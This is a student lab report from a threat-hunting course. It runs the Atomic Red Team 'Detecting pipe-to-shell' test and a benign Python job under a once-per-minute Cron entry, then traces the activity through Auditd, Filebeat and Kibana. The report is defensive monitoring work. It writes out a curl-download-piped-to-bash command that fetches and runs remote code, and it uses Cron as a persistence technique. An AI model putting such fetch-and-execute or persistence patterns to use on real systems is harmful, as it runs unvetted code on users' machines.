# Week 9 — Atomic Red Team and SIEM Monitoring

**Project:** AI Supply Chain Threat Intelligence  
**Course:** Introduction to Threat Hunting · Astana IT University · 2026–2027  
**Lab evidence:** 7–8 November 2026, using the timestamps displayed in the lab

[Back to the project](../README.md)

## 1. Objective and main result

This week tests whether a Linux monitoring system can record execution activity related to an AI software supply chain scenario. We manually executed the official Atomic Red Team **Detecting pipe-to-shell** test, then found a matching Bash process record in Kibana. A separate, harmless Python and Cron demonstration provided additional execution and scheduling evidence.

**Main result:** the lab collected searchable Python and Bash process records through Auditd, Filebeat, and Elasticsearch. The official test also produced its expected marker file. An automatic security alert was **not verified**.

Atomic Red Team provides small tests mapped to MITRE ATT&CK. Its documented commands can be executed manually, which was the method used in this lab. [1]

### Connection to the AI supply chain project

The scenario represents a developer running a downloaded helper while preparing an AI environment. Such a helper could become an execution point if its source were compromised. The Cron exercise represents a way to repeat a local action after the initial execution.

The actual experiment used a timestamp-writing Python script and an official Atomic Red Team demonstration script. It did not load an AI model, install a malicious Python package, poison training data, or transfer private data. These wider attack stages remain scenario context.

| ATT&CK technique | Role in this lab | Implementation | Evidence |
| --- | --- | --- | --- |
| **T1059.004 — Unix Shell** [4] | Execute a downloaded script through Bash | **One official Atomic Red Team test**, run manually | E09–E10 |
| **T1059.006 — Python** [5] | Execute a local Python helper | Custom harmless demonstration | E04, E08 |
| **T1053.003 — Cron** [6] | Configure recurring execution | Custom user-level Cron entry | E05, E08 |

The Python and Cron activities are supporting demonstrations. They are not additional official Atomic Red Team tests.

## 2. Laboratory environment

| Component | Recorded configuration | Purpose |
| --- | --- | --- |
| Kali Linux VM | Host and user: `kali`; 4 vCPUs; approximately 7.1 GiB RAM | Run tests and collect local evidence |
| Atomic Red Team | Local repository at `~/atomic-red-team` | Supply official test definitions |
| Python and Cron | `/usr/bin/python3`; user crontab | Run the custom timestamp helper |
| Auditd | Version 4.1.2; `/var/log/audit/audit.log` | Record selected process activity |
| Filebeat | Version 8.10.2; `auditd` module | Read and forward Auditd records |
| Elasticsearch | Version 8.19.24; HTTPS and authentication | Store and index events |
| Kibana | Version 8.19.24; `http://localhost:5601` | Search and inspect records in Discover |

Auditd wrote local records, Filebeat forwarded them to Elasticsearch, and Kibana displayed the indexed documents. The Filebeat Auditd module uses an ingest pipeline to parse these logs. [7]

The screenshots show the **All logs** data view. The Bash event's index is `.ds-filebeat-8.10.2-2026.11.08-000001`, confirming that Filebeat data was being viewed.

Timestamps below preserve the values displayed by the VM and Kibana. The service-status screenshot shows EST. No conversion to Kazakhstan time is applied.

## 3. Repository and technique review

We confirmed that the Atomic Red Team repository contained the Unix Shell and Cron technique files. We then reviewed their YAML definitions before choosing the execution test.

![Atomic Red Team repository and the Unix Shell and Cron technique files](images/01-atomic-red-team-setup.png)

**Figure 1 · E01 — Repository preparation.** The local repository contains the `atomics` directory and the files for T1059.004 and T1053.003.

<details>
<summary>Figures 2–3 · Technique definitions reviewed before testing</summary>

![Review of the T1059.004 Unix Shell YAML definitions](images/02-unix-shell-technique-review.png)

**Figure 2 · E02 — Unix Shell technique review.** This screenshot shows several T1059.004 definitions, including *Create and Execute Bash Shell Script* and *Command-Line Interface*. It documents the review stage. The test actually executed later was *Detecting pipe-to-shell*, identified in Section 6.

![Review of official T1053.003 Cron test definitions](images/03-cron-technique-review.png)

**Figure 3 · E03 — Cron technique review.** The official Cron definitions were inspected. The subsequent Python schedule was a custom demonstration; this screenshot does not show execution of either official Cron test.

</details>

## 4. Custom Python and Cron demonstration

### 4.1 Manual Python execution

The helper appends a timestamp to `/tmp/ai_supply_chain_demo.log`. It makes no changes to a model or dataset. A copy of its source is included in [scripts/ai_supply_chain_demo.py](scripts/ai_supply_chain_demo.py).

```python
from datetime import datetime

with open("/tmp/ai_supply_chain_demo.log", "a") as f:
    f.write(f"AI Supply Chain test: {datetime.now()}\n")
```

The script was saved as `/tmp/ai_supply_chain_demo.py` and run manually:

```bash
python3 /tmp/ai_supply_chain_demo.py
cat /tmp/ai_supply_chain_demo.log
```

![Creation and manual execution of the harmless Python helper](images/04-python-demo-execution.png)

**Figure 4 · E04 — Successful manual execution.** The log contains `AI Supply Chain test: 2026-11-07 02:14:40.226656`, confirming that this run reached the file-writing operation.

### 4.2 Scheduled execution

The following entry was added to the current user's crontab:

```cron
* * * * * /usr/bin/python3 /tmp/ai_supply_chain_demo.py
```

This schedules the helper once every minute. Cron can support recurring execution and persistence; this lab used the existing `kali` account and did not demonstrate privilege escalation. [6]

![User crontab containing the once-per-minute Python task](images/05-cron-job-configuration.png)

**Figure 5 · E05 — Cron configuration.** The output of `crontab -l` confirms that the schedule was installed. The screenshot establishes the configuration, not the result of every scheduled run.

The Python records in E08 appear at approximately one-minute intervals. That pattern is consistent with this schedule. The selected records do not show a complete Cron parent-process chain or confirm successful completion of every run. A later repeat attempt produced an empty output log, so that attempt is not counted as a successful repeatability test.

## 5. Collecting and searching the telemetry

### 5.1 Audit rules and Filebeat

Temporary Auditd execution watches were used for Python, crontab, and Bash:

```bash
sudo auditctl -w /usr/bin/python3 -p x -k atomic_python
sudo auditctl -w /usr/bin/crontab -p x -k atomic_cron
sudo auditctl -w /usr/bin/bash -p x -k atomic_bash
```

The Bash watch was added before the monitored rerun of the official test. The `crontab` watch records execution of that utility; observing `crontab -l` alone only establishes that the schedule was viewed.

Filebeat's module configuration was:

```yaml
- module: auditd
  log:
    enabled: true
    var.paths: ["/var/log/audit/audit.log*"]
```

The ingest pipeline was loaded with an explicit enabled fileset: [7][8]

```bash
sudo filebeat setup --pipelines --modules auditd -M "auditd.log.enabled=true"
```

Filebeat was then restarted. Its Elasticsearch connection used HTTPS, CA certificate validation, and a password stored in the Filebeat keystore.

During setup, Filebeat failed because the enabled `system` module had no enabled filesets. Disabling the unused `system` and `apache` modules allowed the Auditd collection process to start. The earlier HTTP and authentication errors were also resolved before the successful searches shown below.

![Elasticsearch and Kibana service status showing active processes](images/06-elastic-services-running.png)

**Figure 6 · E06 — Elastic services running.** Both services show `active (running)`. The following Discover screenshots provide the stronger evidence that the interface and event ingestion were usable.

### 5.2 Auditd records in Kibana

The initial KQL search was:

```text
event.module: "auditd"
```

![Kibana Discover showing 3901 matching Auditd documents from Kali](images/07-auditd-events-in-kibana.png)

**Figure 7 · E07 — Auditd ingestion.** Discover shows **3,901 matching documents** in the displayed 24-hour window. The records include `agent.name: kali` and `event.module: auditd`.

This total describes documents returned by the search. It is not the number of attacks or alerts. A single Linux audit event can contain several records with the same event timestamp and serial number. [9]

### 5.3 Python command records

The Python-specific KQL search was:

```text
event.module: "auditd" AND auditd.log.proctitle: *ai_supply_chain_demo.py*
```

![Kibana Python command records with an expanded document](images/08-python-events-in-kibana.png)

**Figure 8 · E08 — Python execution telemetry.** The search returns **140 matching documents**. The expanded record identifies `/usr/bin/python3` and `/tmp/ai_supply_chain_demo.py`, with `event.action: proctitle` and `event.dataset: auditd.log`. The displayed separator between command arguments is a null-character marker.

The five visible rows are dated 8 November 2026:

| Displayed time | Observation |
| --- | --- |
| 05:15:01.435 | Python command record for the helper |
| 05:16:01.457 | Same helper command, approximately one minute later |
| 05:17:01.499 | Same helper command |
| 05:18:01.541 | Same helper command |
| 05:19:01.599 | Expanded record; audit sequence `1021` |

These records support repeated launches consistent with the Cron schedule. The value **140** remains a search-result count, not a verified count of completed scheduled jobs.

## 6. Official Atomic Red Team test

### 6.1 Test identity and execution

| Item | Value |
| --- | --- |
| Test name | **Detecting pipe-to-shell** |
| ATT&CK mapping | **T1059.004 — Unix Shell** |
| Atomic GUID | `fca246a8-a585-4f28-a2df-6495973976a1` |
| Platform | Linux |
| Execution method | Documented executor commands run manually |
| Expected artifact | `/tmp/art.txt` |
| Official definition | [Atomic Red Team T1059.004 catalogue][2] |

The script was downloaded and inspected before execution. Its source writes a small marker file. [3] The following commands, with the default URL substituted, match the official test's executor commands: [2]

```bash
cd /tmp
curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash
ls -la /tmp/art.txt
```

These are the recorded lab commands for the reviewed demonstration script. They reproduce the installation pattern being studied.

![Official pipe-to-shell test command and its marker file](images/09-official-pipe-to-shell-test.png)

**Figure 9 · E09 — Official test execution.** The terminal shows the `curl` download piped into Bash, the message `Being piped`, and the marker file `/tmp/art.txt`. The file is **38 bytes**, owned by `kali`, with a displayed modification time of **8 November, 05:28**.

**Script interpretation:** the script uses `[ -t 1 ]`, which checks whether standard output is connected to a terminal. [3][10] Therefore, its `Being piped` message is illustrative; it is not a reliable detector of a pipe on standard input. The visible command establishes that a pipe was used in this experiment.

### 6.2 Monitored rerun and audit correlation

After adding the Bash watch, the test was rerun with `curl -fsSL` against the same script URL. The terminal audit output recorded an event at **8 November 2026, 05:28:34.042**, with serial **1110**:

| Audit field | Recorded value | Meaning |
| --- | --- | --- |
| Record types | `PROCTITLE`, `EXECVE`, `SYSCALL`, plus path records | Related records describe the process launch |
| Executable | `/usr/bin/bash` | Bash was executed |
| Arguments | `argc=1`, `a0=bash` | Only Bash appears in the arguments; the recorded test command supplied the script through standard input |
| System call | `execve` | A new program image was executed |
| Result | `success=yes`, `exit=0` | The execution system call succeeded; this does not report the script's final exit status |
| PID / PPID | `4919` / `2800` | Process and parent identifiers from the terminal audit output |
| Audit key | `atomic_bash` | The launch matched the added Bash watch |

Related audit records can be matched by their timestamp and serial number. [9] In Kibana, the following search located the corresponding process-title document:

```text
event.module: "auditd" AND auditd.log.proctitle: "bash"
```

![Expanded Kibana Bash event matching the monitored official test](images/10-bash-event-in-kibana.png)

**Figure 10 · E10 — Official test telemetry in Kibana.** Discover shows one matching document at **05:28:34.042**, with `auditd.log.proctitle: bash`, audit sequence **1110**, `event.module: auditd`, and `agent.name: kali`. The time and sequence match the terminal audit event from the monitored rerun.

The event confirms visibility of the Bash launch. It does not independently identify the download URL, prove the full `curl`/pipe relationship, or show a triggered security alert.

## 7. Results and analysis

| Check | Result | Evidence and interpretation |
| --- | --- | --- |
| Official Atomic Test execution | **Confirmed** | E09 shows the documented command and expected marker artifact |
| Official test process telemetry | **Confirmed** | E10 matches the monitored Bash audit event by time and sequence |
| Custom Python execution | **Confirmed** | E04 shows the timestamp output; E08 shows command telemetry |
| User-level Cron configuration | **Confirmed** | E05 shows the installed one-minute schedule |
| Recurring Python launches | **Observed** | E08 contains approximately one-minute intervals, consistent with Cron |
| Successful completion of every Cron run | **Not established** | The selected process records do not prove every output-log write |
| Automatic attack alert or blocking | **Not verified** | The evidence shows Discover events; no alert rule or prevention result was validated |

The monitoring pipeline answered the basic hunting question: **could we find the relevant process activity after executing the test?** The answer was yes for the recorded Python and Bash activity.

The result is narrower than detecting a supply chain attack. Bash and Python also run legitimate software. A useful future detection would combine download activity, process relationships, command arguments, changes to scheduled tasks, and relevant file writes. That correlation was not implemented or evaluated in this lab.

### Evidence limits

- Exactly **one distinct official Atomic Red Team test** is documented. The Python and Cron exercises are custom extensions.
- The counts **3,901**, **140**, and **1** come from different queries and slightly different time windows. They are not detection-rate measurements.
- `PROCTITLE` records show command information. They do not establish the full parent-process chain or successful completion of all script actions.
- The helper and its output were stored under `/tmp`. The script had to be recreated during the lab; persistence across reboot was not validated. The audit watches were temporary as well.
- The test used the upstream `master` URL. The repository commit and downloaded-script hash were not recorded, which limits exact future reproduction.
- Cleanup completion was not captured. The procedure below is provided as a follow-up step.

## 8. Cleanup after evidence collection

Preserve the screenshots and any required logs first. Then remove the marker created by the official test: [2]

```bash
rm -- /tmp/art.txt
```

Use `crontab -e` to remove only the entry below, while keeping unrelated jobs:

```cron
* * * * * /usr/bin/python3 /tmp/ai_supply_chain_demo.py
```

The custom Python file, its temporary log, and the downloaded demonstration script can be removed after their evidence is retained. Remove only the temporary Auditd rules added for this exercise. This report does not claim those cleanup actions were already completed.

## 9. Conclusion

The lab executed the official *Detecting pipe-to-shell* test and made its Bash process activity visible in Kibana. The supporting Python and Cron exercise showed a configured schedule and repeated Python command records consistent with that schedule.

This establishes a working telemetry path for the AI supply chain project: execution on Kali can be recorded, forwarded, and investigated. The next improvement is to correlate those records into a tested detection rule and evaluate false positives. The current evidence supports event monitoring, while automatic threat detection remains unverified.

## References

1. Red Canary. [Atomic Red Team — Getting started][1].
2. Atomic Red Team. [T1059.004 — Detecting pipe-to-shell and other Unix Shell tests][2]. Test GUID: `fca246a8-a585-4f28-a2df-6495973976a1`.
3. Red Canary. [Source of `pipe-to-shell.sh`][3].
4. MITRE ATT&CK. [T1059.004 — Unix Shell][4].
5. MITRE ATT&CK. [T1059.006 — Python][5].
6. MITRE ATT&CK. [T1053.003 — Cron][6].
7. Elastic. [Filebeat Auditd module][7].
8. Elastic. [Load ingest pipelines][8].
9. Linux Audit project. [Audit userspace documentation — Events][9].
10. GNU. [Bash reference manual — Conditional expressions][10].

Figures E01–E10 are the original lab screenshots. Observed versions and terminal results come from the lab session; the documentation above explains the tools and technique mappings.

[1]: https://www.atomicredteam.io/docs/atomic-red-team
[2]: https://www.atomicredteam.io/docs/atomics/T1059.004
[3]: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh
[4]: https://attack.mitre.org/techniques/T1059/004/
[5]: https://attack.mitre.org/techniques/T1059/006/
[6]: https://attack.mitre.org/techniques/T1053/003/
[7]: https://www.elastic.co/docs/reference/beats/filebeat/filebeat-module-auditd
[8]: https://www.elastic.co/docs/reference/beats/filebeat/load-ingest-pipelines
[9]: https://github.com/linux-audit/audit-userspace/blob/master/README.md#events
[10]: https://www.gnu.org/s/bash/manual/html_node/Bash-Conditional-Expressions.html
